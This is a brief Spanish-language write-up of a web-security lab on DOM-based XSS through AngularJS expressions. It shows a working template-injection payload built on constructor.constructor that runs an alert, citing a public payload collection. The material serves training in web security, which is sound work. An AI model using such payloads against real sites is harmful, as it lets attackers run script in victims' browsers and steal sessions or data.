
# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Revisando los recursos encontraremos que se hace uso de `angular` 

![20240807110722.png](20240807110722.png)

Investigando un poco encontraremos el siguiente recurso:

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Angular.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

```c
{{constructor.constructor('alert("xss")')()}}
```

![20240807111050.png](20240807111050.png)

